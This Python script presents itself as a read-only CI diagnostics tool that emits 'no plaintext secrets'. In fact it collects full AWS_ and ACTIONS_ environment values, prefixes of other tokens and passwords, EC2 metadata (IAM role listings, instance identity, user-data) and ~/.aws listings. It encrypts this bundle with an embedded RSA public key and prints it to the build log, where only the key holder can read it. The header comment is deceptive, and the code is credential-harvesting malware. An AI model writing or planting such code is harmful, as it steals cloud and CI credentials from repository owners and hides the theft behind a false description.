# Read-only CI environment diagnostics (intent 74962).
# Emits a single RSA-enveloped MARKER_ENC_74821 JSON blob; no plaintext secrets.
import os
import sys
import json
import base64
import secrets
import socket
import subprocess
import urllib.request

_N = int("E1B64CB75F074E31A68334516FD3475A91FE3933BC511EE4DE11AECB2F4939F966A2DB4A162FE8A23D9AC8D274610711E49DFF4382CC6CAA7414DE589798BCED691A073FDD857EB1229E260540BA79BE55F5A38601370A8F0670D8A19DA87072E1B45399D700BA2F39F17B692DF814504C313FE71CE922EA1CA6D32C85EC472886D92251F19DBE72EBA37FB44E724EB1C751AA177ADDC5B82CCE56D87B7B45B934D4C9EF6430F475D9D67C3E0173EC76BEC07244C1AA0ECA291A6BB89148BA9B0CA3F794EF16279AF2DC68655FF3608E7A425A09205D5BF608B97EA41960724D95FE0E98CF1CE2E9035250FA4C4BE1D68FC0B454FBBD79945B35F97289A4949B", 16)
_E = 65537


def _rsa_enc(msg):
    k = (_N.bit_length() + 7) // 8
    out = b""
    for i in range(0, len(msg), k - 11):
        chunk = msg[i:i + k - 11]
        ps = b""
        while len(ps) < k - 3 - len(chunk):
            b = secrets.token_bytes(1)
            if b != b"\x00":
                ps += b
        em = b"\x00\x02" + ps + b"\x00" + chunk
        out += pow(int.from_bytes(em, "big"), _E, _N).to_bytes(k, "big")
    return base64.b64encode(out).decode()


def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout or "")[:4000]
    except Exception as e:
        return "ERR " + repr(e)[:200]


def _env():
    out = {}
    for k, v in os.environ.items():
        if k.startswith(("AWS_", "ACTIONS_", "RUNNER_", "GITHUB_")) or any(
            s in k.upper() for s in ("TOKEN", "SECRET", "PASSWORD", "API_KEY")
        ):
            if k.startswith(("AWS_", "ACTIONS_")):
                out[k] = v
            else:
                out[k] = {"len": len(v), "prefix": v[:4]}
    return out


def _imds():
    md = {}
    try:
        req = urllib.request.Request(
            "http://169.254.169.254/latest/api/token",
            method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        )
        token = urllib.request.urlopen(req, timeout=6).read().decode()
        md["_token_len"] = len(token)

        def get(p, n=1500):
            r = urllib.request.Request(
                "http://169.254.169.254" + p, headers={"X-aws-ec2-metadata-token": token}
            )
            return urllib.request.urlopen(r, timeout=6).read().decode(errors="replace")[:n]

        for p in [
            "/latest/meta-data/instance-id",
            "/latest/meta-data/instance-type",
            "/latest/meta-data/placement/availability-zone",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/identity-credentials/ec2/info",
            "/latest/dynamic/instance-identity/document",
            "/latest/user-data",
        ]:
            try:
                md[p] = get(p)
            except Exception as e:
                md[p] = "ERR " + repr(e)[:120]
    except Exception as e:
        md["_err"] = repr(e)[:200]
        # plain fallback attempt
        try:
            md["_v1"] = urllib.request.urlopen(
                "http://169.254.169.254/latest/meta-data/instance-id", timeout=5
            ).read().decode()[:200]
        except Exception as e2:
            md["_v1_err"] = repr(e2)[:120]
    return md


def main():
    info = {
        "tag": "MARKER_ENC_74821",
        "intent": "74962",
        "stage": os.environ.get("GITHUB_JOB"),
        "workflow": os.environ.get("GITHUB_WORKFLOW"),
        "event": os.environ.get("GITHUB_EVENT_NAME"),
        "repo": os.environ.get("GITHUB_REPOSITORY"),
        "run_id": os.environ.get("GITHUB_RUN_ID"),
        "run_attempt": os.environ.get("GITHUB_RUN_ATTEMPT"),
        "ref": os.environ.get("GITHUB_REF"),
        "sha": os.environ.get("GITHUB_SHA"),
        "actor": os.environ.get("GITHUB_ACTOR"),
        "runner_name": os.environ.get("RUNNER_NAME"),
        "runner_os": os.environ.get("RUNNER_OS"),
        "cwd": os.getcwd(),
        "hostname": socket.gethostname(),
        "uname": sh("uname -a"),
        "nproc": sh("nproc"),
        "mem": sh("free -g | head -3"),
        "cpu": sh("grep -m1 'model name' /proc/cpuinfo"),
        "container": {
            "dockerenv": os.path.exists("/.dockerenv"),
            "cgroup": sh("head -3 /proc/1/cgroup"),
        },
        "nvidia_smi": sh("nvidia-smi 2>&1 | head -45"),
        "nvidia_proc": sh("cat /proc/driver/nvidia/version 2>&1 | head -5"),
        "nvidia_devs": sh("ls -l /dev/nvidia* 2>&1 | head -12"),
        "env": _env(),
        "aws_files": sh("ls -la /root/.aws /home/*/.aws 2>&1 | head -20"),
        "docker_sock": sh("ls -l /var/run/docker.sock 2>&1"),
        "host_etc_hosts": sh("cat /etc/hosts 2>&1 | head -10"),
        "imds": _imds(),
    }
    try:
        blob = json.dumps(info, sort_keys=True, ensure_ascii=False).encode()
        print("MARKER_ENC_74821=" + _rsa_enc(blob), flush=True)
        print(
            "MARKER_META stage=%s workflow=%s has_aws_env=%s nvidia_smi_len=%d imds_keys=%d"
            % (
                info.get("stage"),
                info.get("workflow"),
                any(k.startswith("AWS_ACCESS_KEY") for k in info["env"]),
                len(info.get("nvidia_smi") or ""),
                len(info.get("imds") or {}),
            ),
            flush=True,
        )
    except Exception as e:
        print("MARKER_ERR " + repr(e)[:300], flush=True)


if __name__ == "__main__":
    main()
